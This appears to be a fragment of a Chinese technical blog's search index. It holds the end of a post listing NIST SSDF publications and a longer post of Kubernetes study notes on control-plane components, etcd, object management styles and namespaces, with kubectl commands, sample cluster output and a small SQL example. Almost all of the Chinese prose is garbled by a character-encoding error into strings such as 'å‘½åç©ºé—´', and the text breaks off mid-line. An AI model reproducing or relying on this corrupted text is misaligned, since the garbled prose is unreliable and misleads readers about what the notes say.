‡å‡†\n\n\nSeries &amp; Number\nTitle\nStatus\nReleased\n\n\n\nSP 800-218\nSecure Software Development Framework (SSDF) Version 1.1: Recommendations for Mitigating the Risk of Software Vulnerabilities\nFinal\n02&#x2F;03&#x2F;2022\n\n\nSP 800-218 (Draft)\nSecure Software Development Framework (SSDF) Version 1.1: Recommendations for Mitigating the Risk of Software Vulnerabilities\nDraft\n09&#x2F;30&#x2F;2021\n\n\nWhite Paper NIST CSWP 13\nMitigating the Risk of Software Vulnerabilities by Adopting a Secure Software Development Framework (SSDF)\nWithdrawn\n04&#x2F;23&#x2F;2020\n\n\nğŸ“šå‚è€ƒèµ„æ–™\nNIST.SP.800-218.pdfhttps://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-218.pdf\nNIST.CSWP.04232020.pdfhttps://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf\n\n","slug":"è½¯ä»¶æˆåˆ†åˆ†æå·¥å…·è¯„ä¼°å¼€æ”¾æŒ‡å—","date":"2022-10-26T01:08:35.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,è½¯ä»¶æˆåˆ†åˆ†æ,äº§å“é€‰å‹,è¯„ä¼°å¼€æ”¾æŒ‡å—","author_index":"Moses"},{"id":"ce038301b34a6d4d69c83e210fe584c3","title":"k8såˆ†å¸ƒå¼ç³»ç»Ÿè§†è§’ä¸‹é‡æ–°å­¦ä¹ ","content":"æ¦‚è¿°å®˜ç½‘åœ°å€ Kubernetesæ˜¯ä»€ä¹ˆ?å®˜ç½‘åœ°å€\næ—¶å…‰å›æº¯[[History of cloud]]\nä¼ ç»Ÿéƒ¨ç½²æ—¶ä»£ä¾‹å¦‚ï¼šå®‰è£…Oracle\n\né’ˆå¯¹æ“ä½œç³»ç»Ÿå‡†å¤‡å®‰è£…åŒ…(ä¸‹è½½æˆ–è€…Uç›˜æ‹·è´)\nå®‰è£…Oracleéœ€è¦çš„åŸºç¡€ç±»åº“\né…ç½®æ“ä½œç³»ç»Ÿçš„ç›¸åº”é…ç½®\næ‰§è¡Œå®‰è£…æ£€æŸ¥ï¼Œå®‰è£…å‘½ä»¤\nå®‰è£…å¤±è´¥ä¹‹åï¼Œè¦å®Œå…¨å¸è½½\n\nè™šæ‹ŸåŒ–éƒ¨ç½²æ—¶ä»£\nåªæ˜¯åšäº†ç‰©ç†èµ„æºéš”ç¦»ï¼Œå®‰è£…ä¸€ä¸ªOracleä»æ—§æ˜¯ä¸ªå¤æ‚çš„è¿‡ç¨‹ã€‚\n\nå®¹å™¨éƒ¨ç½²æ—¶ä»£\næ•æ·åº”ç”¨ç¨‹åºçš„åˆ›å»ºå’Œéƒ¨ç½²\nå…³æ³¨ç‚¹åœ¨å¦‚ä½•æ„å»ºåº”ç”¨ç¨‹åºçš„é•œåƒä»¥åŠå¯åŠ¨é•œåƒæ—¶çš„å‚æ•°é…ç½®\næŒç»­å¼€å‘ã€é›†æˆå’Œéƒ¨ç½²\nå…³æ³¨å¼€å‘å’Œè¿ç»´çš„åˆ†ç¦»\nå¯è§‚å¯Ÿæ€§ è·¨å¼€å‘ã€æµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒçš„ä¸€è‡´æ€§\nå¯ä»¥ä½¿ç”¨åŒæ ·çš„æ„å»ºäº§ç‰©ï¼Œåœ¨ä¸åŒçš„ç¯å¢ƒä¸Šè¿è¡Œï¼Œåªæ˜¯å¯åŠ¨å‚æ•°çš„å·®å¼‚ã€‚\nè·¨äº‘å’Œæ“ä½œç³»ç»Ÿå‘å‹ç‰ˆæœ¬çš„å¯ç§»æ¤æ€§\nå®¹å™¨è¿è¡Œç¯å¢ƒè§£å†³äº†ä¸åŒçš„äº‘å’Œæ“ä½œç³»ç»Ÿä¹‹é—´çš„å·®å¼‚\n\n\nä»¥åº”ç”¨ç¨‹åºä¸ºä¸­å¿ƒçš„ç®¡ç†\næ¾è€¦åˆã€åˆ†å¸ƒå¼ã€å¼¹æ€§ã€è§£æ”¾çš„å¾®æœåŠ¡\nåº”ç”¨è·Ÿç¡¬ä»¶ï¼Œæ“ä½œç³»ç»Ÿï¼Œç½‘ç»œéƒ½æ²¡æœ‰å…³ç³»\nå¼¹æ€§ï¼šå‰¯æœ¬æ•°å¯ä¼¸ç¼©\n\n\nèµ„æºéš”ç¦»\næ¯ä¸ªåº”ç”¨ä½¿ç”¨çš„èµ„ç®¡äº’ä¸å½±å“\n\n\nèµ„æºåˆ©ç”¨\nä¸€ä¸ªåº”ç”¨çš„èµ„æºåˆ©ç”¨ä¸æ˜¯å›ºå®šçš„ï¼Œä¾‹å¦‚å¯åŠ¨ä¸€ä¸ªåº”ç”¨çš„æœ€ä½é…ç½®å’Œæœ€å¤§éœ€è¦çš„é…ç½®ç­‰ã€‚\n\n\n\nä¸ºä»€ä¹ˆéœ€è¦Kubernetes,å®ƒèƒ½åšä»€ä¹ˆ?\næœåŠ¡å‘ç°å’Œè´Ÿè½½å‡è¡¡\nå¾®æœåŠ¡çš„ä¸¤å¤§åŸºçŸ³\nRPC\næ¶ˆæ¯\n\n\n\n\nå­˜å‚¨ç¼–æ’\nè‡ªåŠ¨éƒ¨ç½²å’Œå›æ»š\nè‡ªåŠ¨å®Œæˆè£…ç®±è®¡ç®—\nèƒŒåŒ…é—®é¢˜\n\n\nè‡ªæˆ‘ä¿®å¤\nä¼ ç»Ÿéƒ¨ç½²æ–¹æ¡ˆéœ€è¦å†™å®šæ—¶ä»»åŠ¡æ¥åšåº”ç”¨å¥åº·æ£€æŸ¥å’Œè‡ªæˆ‘ä¿®å¤\n\n\nç§˜é’¥ä¸é…ç½®ç®¡ç†\n\nKubernetesä¸æ˜¯ä»€ä¹ˆ\nä¸é™åˆ¶æ”¯æŒçš„åº”ç”¨ç±»å‹ã€‚\nä¸éƒ¨ç½²æºä»£ç ,ä¹Ÿä¸æ„å»ºä½ çš„åº”ç”¨ç¨‹åºã€‚\n\nKubernetesç»„ä»¶å®˜ç½‘åœ°å€\næ§åˆ¶å¹³é¢ç»„ä»¶(Control Plane Components)\nkube-apiserver\nè¯¥ç»„ä»¶å…¬å¼€äº† Kubernetes API\næ”¯æŒæ°´å¹³æ‰©å±•\nxè½´æ‰©å±• å¢åŠ å‰¯æœ¬æ•° âœ”ï¸\nyè½´æ‰©å±• åŠŸèƒ½ã€ä¸šåŠ¡æ‹†åˆ†æˆä¸åŒçš„å¾®æœåŠ¡\nzè½´æ‰©å±• æ•°æ®åˆ†ç‰‡ï¼Œç§Ÿæˆ·éš”ç¦»\n\n\n\n\n\netcdç®€ä»‹etcd æ˜¯å…¼å…·ä¸€è‡´æ€§å’Œé«˜å¯ç”¨æ€§çš„é”®å€¼æ•°æ®åº“\nç‰¹ç‚¹ [[CAP]]çš„æŠ‰æ‹©ï¼Œetcdæ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå¿…ç„¶æ— æ³•é¿å¼€é€‰æ‹©Pï¼Œåœ¨CAä¸­é€‰æ‹©C,å³CPã€‚\n\nä¸€è‡´æ€§ âœ”ï¸\né«˜å¯ç”¨ âœ”ï¸\nåˆ†åŒºå®¹é”™ X\n\nå¯¹æ¯”VSConsul Zookeeper etcd versus other key-value stores | etcd\nä¸¤å¤§ä½¿ç”¨åœºæ™¯\nUsing etcd for metadata\nUsing etcd for distributed coordination\n\nkube-schedulerè´Ÿè´£ç›‘è§†æ–°åˆ›å»ºçš„ã€æœªæŒ‡å®šè¿è¡ŒèŠ‚ç‚¹çš„ Podsï¼Œé€‰æ‹©èŠ‚ç‚¹è®© Pod åœ¨ä¸Šé¢è¿è¡Œã€‚\nè°ƒåº¦å†³ç­–è€ƒè™‘çš„å› ç´ åŒ…æ‹¬\nå•ä¸ª Pod å’Œ Pod é›†åˆçš„èµ„æºéœ€æ±‚\nç¡¬ä»¶&#x2F;è½¯ä»¶&#x2F;ç­–ç•¥çº¦æŸ\näº²å’Œæ€§å’Œåäº²å’Œæ€§è§„èŒƒ\næ•°æ®ä½ç½®\nå·¥ä½œè´Ÿè½½é—´çš„å¹²æ‰°å’Œæœ€åæ—¶é™\n\nkube-controller-manager\nèŠ‚ç‚¹æ§åˆ¶å™¨ï¼ˆNode Controllerï¼‰: è´Ÿè´£åœ¨èŠ‚ç‚¹å‡ºç°æ•…éšœæ—¶è¿›è¡Œé€šçŸ¥å’Œå“åº”\nä»»åŠ¡æ§åˆ¶å™¨ï¼ˆJob controllerï¼‰: ç›‘æµ‹ä»£è¡¨ä¸€æ¬¡æ€§ä»»åŠ¡çš„ Job å¯¹è±¡ï¼Œç„¶ååˆ›å»º Pods æ¥è¿è¡Œè¿™äº›ä»»åŠ¡ç›´è‡³å®Œæˆ\nç«¯ç‚¹æ§åˆ¶å™¨ï¼ˆEndpoints Controllerï¼‰: å¡«å……ç«¯ç‚¹(Endpoints)å¯¹è±¡(å³åŠ å…¥ Service ä¸ Pod)\næœåŠ¡å¸æˆ·å’Œä»¤ç‰Œæ§åˆ¶å™¨ï¼ˆService Account &amp; Token Controllersï¼‰: ä¸ºæ–°çš„å‘½åç©ºé—´åˆ›å»ºé»˜è®¤å¸æˆ·å’Œ API è®¿é—®ä»¤ç‰Œ\n\ncloud-controller-manager\nèŠ‚ç‚¹æ§åˆ¶å™¨ï¼ˆNode Controllerï¼‰: ç”¨äºåœ¨èŠ‚ç‚¹ç»ˆæ­¢å“åº”åæ£€æŸ¥äº‘æä¾›å•†ä»¥ç¡®å®šèŠ‚ç‚¹æ˜¯å¦å·²è¢«åˆ é™¤\nè·¯ç”±æ§åˆ¶å™¨ï¼ˆRoute Controllerï¼‰: ç”¨äºåœ¨åº•å±‚äº‘åŸºç¡€æ¶æ„ä¸­è®¾ç½®è·¯ç”±\næœåŠ¡æ§åˆ¶å™¨ï¼ˆService Controllerï¼‰: ç”¨äºåˆ›å»ºã€æ›´æ–°å’Œåˆ é™¤äº‘æä¾›å•†è´Ÿè½½å‡è¡¡å™¨\n\nNodeç»„ä»¶kubelet\nä¸€ä¸ªåœ¨é›†ç¾¤ä¸­æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œçš„ä»£ç†ã€‚\nå®ƒä¿è¯å®¹å™¨ï¼ˆcontainersï¼‰éƒ½ è¿è¡Œåœ¨ Pod ä¸­ã€‚\nkubelet æ¥æ”¶ä¸€ç»„é€šè¿‡å„ç±»æœºåˆ¶æä¾›ç»™å®ƒçš„ PodSpecsï¼Œç¡®ä¿è¿™äº› PodSpecs ä¸­æè¿°çš„å®¹å™¨å¤„äºè¿è¡ŒçŠ¶æ€ä¸”å¥åº·ã€‚\nkubelet ä¸ä¼šç®¡ç†ä¸æ˜¯ç”± Kubernetes åˆ›å»ºçš„å®¹å™¨ã€‚\n\nkube-proxy\næ˜¯é›†ç¾¤ä¸­æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œçš„ç½‘ç»œä»£ç†\nç»´æŠ¤èŠ‚ç‚¹ä¸Šçš„ç½‘ç»œè§„åˆ™\nå¦‚æœæ“ä½œç³»ç»Ÿæä¾›äº†æ•°æ®åŒ…è¿‡æ»¤å±‚å¹¶å¯ç”¨çš„è¯ï¼Œkube-proxy ä¼šé€šè¿‡å®ƒ(ä¾‹å¦‚[[iptables]])æ¥å®ç°ç½‘ç»œè§„åˆ™ã€‚å¦åˆ™ï¼Œ kube-proxy ä»…è½¬å‘æµé‡æœ¬èº«ã€‚\nå®¹å™¨è¿è¡Œæ—¶(Container Runtime)\n[[CRI&amp;OCI]]\n\næ’ä»¶(Addon)DNS\né›†ç¾¤ DNS æ˜¯ä¸€ä¸ª DNS æœåŠ¡å™¨ï¼Œå’Œç¯å¢ƒä¸­çš„å…¶ä»– DNS æœåŠ¡å™¨ä¸€èµ·å·¥ä½œï¼Œå®ƒä¸º Kubernetes æœåŠ¡æä¾› DNS è®°å½•ã€‚\nKubernetes å¯åŠ¨çš„å®¹å™¨è‡ªåŠ¨å°†æ­¤ DNS æœåŠ¡å™¨åŒ…å«åœ¨å…¶ DNS æœç´¢åˆ—è¡¨ä¸­ã€‚\nWebç•Œé¢(ä»ªè¡¨ç›˜)\nå®¹å™¨èµ„æºç›‘æ§\né›†ç¾¤å±‚é¢æ—¥å¿—\n\nKubernetesAPI å®˜ç½‘åœ°å€\n\nOpenAPIè§„èŒƒ\nOpenAPI V2\nOpenAPI V3\n\nä½¿ç”¨Kuberneteså¯¹è±¡ å®˜ç½‘åœ°å€ç†è§£Kuberneteså¯¹è±¡ å®˜ç½‘åœ°å€\næ€»ç»“\nKubernetes å¯¹è±¡æ˜¯æŒä¹…åŒ–çš„å®ä½“\nKubernetes ä½¿ç”¨è¿™äº›å®ä½“å»è¡¨ç¤ºæ•´ä¸ªé›†ç¾¤çš„çŠ¶æ€\nè¾¾æˆçš„æ•ˆæœ\nå“ªäº›å®¹å™¨åŒ–åº”ç”¨åœ¨è¿è¡Œï¼ˆä»¥åŠåœ¨å“ªäº›èŠ‚ç‚¹ä¸Šï¼‰\nå¯ä»¥è¢«åº”ç”¨ä½¿ç”¨çš„èµ„æº\nå…³äºåº”ç”¨è¿è¡Œæ—¶è¡¨ç°çš„ç­–ç•¥ï¼Œæ¯”å¦‚é‡å¯ç­–ç•¥ã€å‡çº§ç­–ç•¥ï¼Œä»¥åŠå®¹é”™ç­–ç•¥\n\n\nKubernetes å¯¹è±¡æ˜¯ â€œç›®æ ‡æ€§è®°å½•â€ â€”â€” ä¸€æ—¦åˆ›å»ºå¯¹è±¡ï¼ŒKubernetes ç³»ç»Ÿå°†æŒç»­å·¥ä½œä»¥ç¡®ä¿å¯¹è±¡å­˜åœ¨ã€‚ é€šè¿‡åˆ›å»ºå¯¹è±¡ï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨å‘ŠçŸ¥ Kubernetes ç³»ç»Ÿï¼Œæ‰€éœ€è¦çš„é›†ç¾¤å·¥ä½œè´Ÿè½½çœ‹èµ·æ¥æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Œ è¿™å°±æ˜¯ Kubernetes é›†ç¾¤çš„ æœŸæœ›çŠ¶æ€ï¼ˆDesired Stateï¼‰ã€‚select amount from wallet where user_id &#x3D; 123456;\n100\t\t\t\t\t\t  \nupdate wallet set amount &#x3D; amount+10 where user_id &#x3D; 123456;\t\t\t\t\t\t \nor \t\t\t\t\t\t  \nupdate wallet set amount &#x3D; 100+10 where user_id &#x3D; 123456; \næ‰€æœ‰å¯¹Kuberneteså¯¹è±¡çš„æ“ä½œï¼Œæœ€ç»ˆéƒ½æ˜¯é€šè¿‡ä½¿ç”¨ Kubernetes API\n\nå¯¹è±¡è§„çº¦ï¼ˆSpecï¼‰ä¸çŠ¶æ€ï¼ˆStatusï¼‰\nSpecï¼š å¯¹è±¡æœŸæœ›çŠ¶æ€ï¼ˆDesired Stateï¼‰\nStatusï¼šå¯¹è±¡å½“å‰çŠ¶æ€ï¼ˆCurrent Stateï¼‰\næè¿° Kubernetes å¯¹è±¡\nå¤šæ•°æƒ…å†µä¸‹æ˜¯ä½¿ç”¨yamlæ–‡ä»¶æè¿°ã€‚\nå¿…éœ€å­—æ®µ\n\n\napiVersion - åˆ›å»ºè¯¥å¯¹è±¡æ‰€ä½¿ç”¨çš„ Kubernetes API çš„ç‰ˆæœ¬\nä¾‹å¦‚ï¼šapps&#x2F;v1\n\n\nkind - æƒ³è¦åˆ›å»ºçš„å¯¹è±¡çš„ç±»åˆ«\nä¾‹å¦‚ï¼šPodï¼ŒDeploymentï¼ŒService\n\n\nmetadata - å¸®åŠ©å”¯ä¸€æ€§æ ‡è¯†å¯¹è±¡çš„ä¸€äº›æ•°æ®ï¼ŒåŒ…æ‹¬ä¸€ä¸ª name å­—ç¬¦ä¸²ã€UID å’Œå¯é€‰çš„ namespac\nspec - ä½ æ‰€æœŸæœ›çš„è¯¥å¯¹è±¡çš„çŠ¶æ€ï¼Œå¯¹è±¡ spec çš„ç²¾ç¡®æ ¼å¼å¯¹æ¯ä¸ª Kubernetes å¯¹è±¡æ¥è¯´æ˜¯ä¸åŒçš„ã€‚\n\nKuberneteså¯¹è±¡ç®¡ç† å®˜ç½‘åœ°å€\nç®¡ç†æŠ€å·§\næŒ‡ä»¤å¼å‘½ä»¤å®˜æ–¹æ–‡æ¡£\nä¾‹å­kubectl create deployment nginx --image nginx\næƒè¡¡\nä¸å¯¹è±¡é…ç½®ç›¸æ¯”çš„æœ‰ç‚¹ï¼š\nå‘½ä»¤ç®€å•ï¼Œæ˜“å­¦ä¸”æ˜“äºè®°å¿†ã€‚\nå‘½ä»¤ä»…éœ€ä¸€æ­¥å³å¯å¯¹é›†ç¾¤è¿›è¡Œæ›´æ”¹ã€‚\nä¸å¯¹è±¡é…ç½®ç›¸æ¯”çš„ç¼ºç‚¹ï¼š\nå‘½ä»¤ä¸ä¾¿äºä¸å˜æ›´å®¡æŸ¥æµç¨‹çš„é›†æˆã€‚\nå‘½ä»¤ä¸æä¾›ä¸æ›´æ”¹å…³è”çš„å®¡æ ¸è·Ÿè¸ªã€‚\né™¤äº†å®æ—¶å†…å®¹å¤–ï¼Œå‘½ä»¤ä¸æä¾›è®°å½•åŸã€‚\n\n\n\næŒ‡ä»¤å¼å¯¹è±¡é…ç½® å®˜æ–¹æ–‡æ¡£\nä¾‹å­kubectl create -f nginx.yaml\nkubectl delete -f nginx.yaml -f redis.yaml\nkubectl replace -f nginx.yaml\næƒè¡¡ä¸æ‰§è¡Œä»¤å¼å‘½ä»¤ç›¸æ¯”ä¼˜ç‚¹\nå¯¹è±¡é…ç½®å¯ä»¥å­˜å‚¨åœ¨æºæ§åˆ¶ç³»ç»Ÿä¸­ï¼Œæ¯”å¦‚Gitã€‚\nå¯¹è±¡é…ç½®å¯ä»¥ä¸æµç¨‹é›†æˆï¼Œä¾‹å¦‚åœ¨æ¨é€å’Œå®¡è®¡ä¹‹å‰æ£€æŸ¥æ›´æ–°ã€‚\nå¯¹è±¡é…ç½®æä¾›äº†ç”¨äºåˆ›å»ºæ–°å¯¹è±¡çš„æ¨¡æ¿ã€‚\n\nä¸æ‰§è¡Œä»¤å¼å‘½ä»¤ç›¸æ¯”ç¼ºç‚¹ï¼š\nå¯¹è±¡é…ç½®éœ€è¦å¯¹å¯¹è±¡æ¶æ„æœ‰åŸºæœ¬çš„äº†è§£ã€‚(ä¸ç®—ç¼ºç‚¹)\nå¯¹è±¡é…ç½®éœ€è¦é¢å¤–çš„æ­¥éª¤æ¥ç¼–å†™yamlæ–‡ä»¶ã€‚\n\nä¸å£°æ˜å¼å¯¹è±¡é…ç½®ç›¸æ¯”ä¼˜ç‚¹ï¼š\næŒ‡ä»¤å¼å¯¹è±¡é…ç½®è¡Œä¸ºæ›´åŠ ç®€å•æ˜“æ‡‚ã€‚\nä» Kubernetes 1.5 ç‰ˆæœ¬å¼€å§‹ï¼ŒæŒ‡ä»¤å¯¹è±¡é…ç½®æ›´åŠ æˆç†Ÿã€‚\n\nä¸å£°æ˜å¼å¯¹è±¡é…ç½®ç›¸æ¯”ç¼ºç‚¹ï¼š\næŒ‡ä»¤å¼å¯¹è±¡é…ç½®æ›´é€‚åˆæ–‡ä»¶ï¼Œè€Œéç›®å½•ã€‚\nå¯¹æ´»åŠ¨å¯¹è±¡çš„æ›´æ–°ï¼Œå¿…é¡»ååº”åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œå¦åˆ™ä¼šåœ¨ä¸‹ä¸€æ¬¡æ›¿æ¢æ—¶ä¸¢å¤±ã€‚(æ¯”å¦‚å‰¯æœ¬æ•°ï¼Œæ–‡ä»¶ä¸­ä¸º3ï¼Œæ‰‹åŠ¨è°ƒæ•´ä¸º6åï¼Œé‡æ–°å‘å¸ƒï¼Œåˆå˜å›äº†3)\n\nå£°æ˜å¼å¯¹è±¡é…ç½®å®˜æ–¹æ–‡æ¡£\nä¾‹å­kubectl diff -f configs&#x2F;\nkubectl apply -f configs&#x2F;\nkubectl diff -R -f configs&#x2F;\nkubectl apply -R -f configs&#x2F;\næƒè¡¡ä¸æŒ‡ä»¤å¼å¯¹è±¡é…ç½®ç›¸æ¯”ä¼˜ç‚¹ï¼š\nå¯¹æ´»åŠ¨å¯¹è±¡æ‰€åšçš„æ›´æ”¹å³ä½¿æœªåˆå¹¶åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œä¹Ÿä¼šè¢«ä¿ç•™ä¸‹æ¥ã€‚\nå£°æ˜æ€§å¯¹è±¡é…ç½®æ›´å¥½åœ°æ”¯æŒå¯¹ç›®å½•è¿›è¡Œæ“ä½œå¹¶è‡ªåŠ¨æ£€æµ‹æ¯ä¸ªæ–‡ä»¶çš„æ“ä½œç±»å‹(åˆ›å»ºï¼Œä¿®è¡¥ï¼Œåˆ é™¤)ã€‚\n\nä¸æŒ‡ä»¤å¼å¯¹è±¡é…ç½®ç›¸æ¯”ç¼ºç‚¹ï¼š\nå£°æ˜å¼å¯¹è±¡é…ç½®éš¾äºè°ƒè¯•å¹¶ä¸”å‡ºç°å¼‚å¸¸æ—¶ç»“æœéš¾ä»¥è§£é‡Šã€‚\nä½¿ç”¨diffäº§ç”Ÿçš„éƒ¨åˆ†æ›´æ–°ä¼šåˆ›å»ºå¤æ‚çš„åˆå¹¶å’Œå¸ƒä¸æ“ä½œã€‚\n\nåˆ†æå·¥ä½œåœºæ™¯ï¼Œé€‰æ‹©åˆé€‚çš„æ–¹æ¡ˆè¿ç»´ä¸­è¦è§£å†³çš„é—®é¢˜\n1.å®¡è®¡ï¼Œè°åœ¨ä»€ä¹ˆæ—¶é—´åšäº†ä»€ä¹ˆæ“ä½œï¼Œè¾¾åˆ°äº†ä»€ä¹ˆæ•ˆæœ\n2.å¯é‡å¤æ‰§è¡Œï¼Œç›¸åŒçš„æ“ä½œé‡å¤æ‰§è¡Œï¼Œç»“æœä¸å˜\n3.å¯å›æ»š\nä¾¿æ·ä¸”å®‰å…¨çš„å›æ»šæ–¹æ¡ˆï¼Œæ”¯æŒå•ä¸ªåº”ç”¨å’Œå¤šä¸ªç›¸å…³åº”ç”¨çš„å›æ»šã€‚\nå‘½ä»¤å¦‚ä½•å›æ»šï¼Œé…ç½®å¦‚ä½•å›æ»šï¼Ÿ\n\n\n4.ç‰ˆæœ¬æ§åˆ¶ï¼Œç‰ˆæœ¬å·®å¼‚çš„æ¯”å¯¹\n5.CI&#x2F;CD\n\nå¯¹è±¡åç§°å’ŒIDså®˜ç½‘åœ°å€ åç§° é›†ç¾¤ä¸­çš„æ¯ä¸€ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåç§° æ¥æ ‡è¯†åœ¨åŒç±»èµ„æºä¸­çš„å”¯ä¸€æ€§ã€‚\n\nDNSå­åŸŸå\nä¸èƒ½è¶…è¿‡253ä¸ªå­—ç¬¦\nåªèƒ½åŒ…å«å°å†™å­—æ¯ã€æ•°å­—ï¼Œä»¥åŠâ€™-â€˜ å’Œ â€˜.â€™\né¡»ä»¥å­—æ¯æ•°å­—å¼€å¤´\né¡»ä»¥å­—æ¯æ•°å­—ç»“å°¾\nRFC 1123\n\n\næœ€å¤š 63 ä¸ªå­—ç¬¦\nåªèƒ½åŒ…å«å°å†™å­—æ¯ã€æ•°å­—ï¼Œä»¥åŠ â€˜-â€˜\né¡»ä»¥å­—æ¯æ•°å­—å¼€å¤´\né¡»ä»¥å­—æ¯æ•°å­—ç»“å°¾\nRFC 1035          - è·¯å¾„åˆ†æ®µåç§°\n\n\nUIDs æ¯ä¸ª Kubernetes å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªUID æ¥æ ‡è¯†åœ¨æ•´ä¸ªé›†ç¾¤ä¸­çš„å”¯ä¸€æ€§ã€‚\n\nå‘½åç©ºé—´å®˜ç½‘åœ°å€\nä½œç”¨\nå°†åŒä¸€é›†ç¾¤ä¸­çš„èµ„æºåˆ’åˆ†ä¸ºç›¸äº’éš”ç¦»çš„ç»„ã€‚\n\né™åˆ¶\nåŒä¸€å‘½åç©ºé—´å†…çš„èµ„æºåç§°è¦å”¯ä¸€ï¼Œä½†å‘½åç©ºé—´æ—¶æ²¡æœ‰è¿™ä¸ªè¦æ±‚ã€‚\nä½œç”¨äºDemploymentã€Serviceç­‰ã€‚\nå¯¹StorageClassã€Nodeã€PersistentVolumeç­‰ä¸é€‚åº”ã€‚\n\nä½•æ—¶ä½¿ç”¨å¤šä¸ªå‘½åç©ºé—´\nå‘½åç©ºé—´é€‚ç”¨äºå­˜åœ¨å¾ˆå¤šè·¨å¤šä¸ªå›¢é˜Ÿæˆ–é¡¹ç›®çš„ç”¨æˆ·çš„åœºæ™¯ã€‚\nå‘½åç©ºé—´ä¸èƒ½ç›¸äº’åµŒå¥—ï¼Œæ¯ä¸ª Kubernetes èµ„æºåªèƒ½åœ¨ä¸€ä¸ªåå­—ç©ºé—´ä¸­ã€‚\nå‘½åç©ºé—´æ˜¯åœ¨å¤šä¸ªç”¨æˆ·ä¹‹é—´åˆ’åˆ†é›†ç¾¤èµ„æºçš„ä¸€ç§æ–¹æ³•ã€‚ ä¸å¿…ä½¿ç”¨å¤šä¸ªåå­—ç©ºé—´æ¥åˆ†éš”ä»…ä»…è½»å¾®ä¸åŒçš„èµ„æºï¼Œä¾‹å¦‚åŒä¸€è½¯ä»¶çš„ä¸åŒç‰ˆæœ¬ï¼š åº”è¯¥ä½¿ç”¨æ ‡ç­¾ æ¥åŒºåˆ†åŒä¸€åå­—ç©ºé—´ä¸­çš„ä¸åŒèµ„æºã€‚\n\nä½¿ç”¨å‘½åç©ºé—´æŸ¥çœ‹å‘½åç©ºé—´\n## å¾…æ‰§è¡Œçš„å‘½ä»¤\nkubectl get namespace\n## æ‰§è¡Œç»“æœ\n[root@k8s-master-22 ~]# kubectl get namespaces\nNAME              STATUS   AGE\ndefault           Active   13d\nistio-system      Active   13d\nkube-node-lease   Active   13d\nkube-public       Active   13d\nkube-system       Active   13d\n[root@k8s-master-22 ~]#\nKubernetesä¼šåˆ›å»ºå››ä¸ªåˆå§‹çš„å‘½åç©ºé—´\ndefault æ²¡æœ‰æŒ‡æ˜ä½¿ç”¨å…¶å®ƒåå­—ç©ºé—´çš„å¯¹è±¡æ‰€ä½¿ç”¨çš„é»˜è®¤åå­—ç©ºé—´\nkube-system Kubernetes ç³»ç»Ÿåˆ›å»ºå¯¹è±¡æ‰€ä½¿ç”¨çš„åå­—ç©ºé—´\nkube-public è¿™ä¸ªå‘½åç©ºé—´æ˜¯è‡ªåŠ¨åˆ›å»ºçš„ï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥è¯»å–å®ƒã€‚\nkube-node-lease æ­¤å‘½åç©ºé—´ç”¨äºä¸å„ä¸ªèŠ‚ç‚¹ç›¸å…³çš„ç§Ÿçº¦å¯¹è±¡ã€‚å…è®¸kubeletå‘é€å¿ƒè·³åˆ°api-server\n\næ“ä½œæŒ‡å®šå‘½åç©ºé—´ä¾‹å¦‚\nkubectl run nginx --image&#x3D;nginx --namespace&#x3D;&lt;insert-namespace-name-here&gt;\nkubectl get pods --namespace&#x3D;&lt;insert-namespace-name-here&gt;\n\n## å®é™…æ‰§è¡Œç»“æœ\nkubectl get pod --namespace&#x3D;kube-system\n[root@k8s-master-22 ~]# kubectl get pod --namespace&#x3D;kube-system\nNAME                                       READY   STATUS    RESTARTS        AGE\ncalico-kube-controllers-6fd7b9848d-4zlm5   1&#x2F;1     Running   3 (4h40m ago)   13d\ncalico-node-5c694                          1&#x2F;1     Running   3 (4h40m ago)   13d\ncalico-node-qgtxj                          1&#x2F;1     Running   3 (4h40m ago)   13d\ncoredns-7f6cbbb7b8-r4px6                   1&#x2F;1     Running   3 (4h39m ago)   13d\ncoredns-7f6cbbb7b8-snbdj                   1&#x2F;1     Running   3 (4h39m ago)   13d\netcd-k8s-master-22                         1&#x2F;1     Running   4 (25m ago)     13d\nkube-apiserver-k8s-master-22               1&#x2F;1     Running   6 (24m ago)     13d\nkube-controller-manager-k8s-master-22      1&#x2F;1     Running   4 (25m ago)     13d\nkube-proxy-c964g                           1&#x2F;1     Running   3 (4h40m ago)   13d\nkube-proxy-sdqxg                           1&#x2F;1     Running   3 (4h40m ago)   13d\nkube-scheduler-k8s-master-22               1&#x2F;1     Running   4 (25m ago)     13d\n\nè®¾ç½®é»˜è®¤çš„å‘½åç©ºé—´å½“å‰é»˜è®¤å‘½åç©ºé—´ä¸ºdefaultkubectl get pod\n## å®é™…æ‰§è¡Œç»“æœ\n[root@k8s-master-22 ~]# kubectl get pod\nNAME                              READY   STATUS    RESTARTS        AGE\ncat-dp-58cf7df488-gf8h4           2&#x2F;2     Running   6 (4h42m ago)   13d\ndetails-v1-79f774bdb9-jd7tv       2&#x2F;2     Running   6 (4h42m ago)   13d\ndog-dp-b6c8757d4-dts8v            2&#x2F;2     Running   6 (4h42m ago)   13d\nproductpage-v1-6b746f74dc-slrjm   2&#x2F;2     Running   6 (4h42m ago)   13d\nratings-v1-b6994bb9-pnnss         2&#x2F;2     Running   6 (4h42m ago)   13d\nreviews-v1-545db77b95-8xl8k       2&#x2F;2     Running   6 (4h42m ago)   13d\nreviews-v2-7bf8c9648f-wklnd       2&#x2F;2     Running   6 (4h42m ago)   13d\nreviews-v3-84779c7bbc-ckb87       2&#x2F;2     Running   6 (4h42m ago)   13d\nkubectl get pod -n default\n## å®é™…æ‰§è¡Œç»“æœ\n[root@k8s-master-22 ~]# kubectl get pod -n default\nNAME                              READY   STATUS    RESTARTS        AGE\ncat-dp-58cf7df488-gf8h4           2&#x2F;2     Running   6 (4h43m ago)   13d\ndetails-v1-79f774bdb9-jd7tv       2&#x2F;2     Running   6 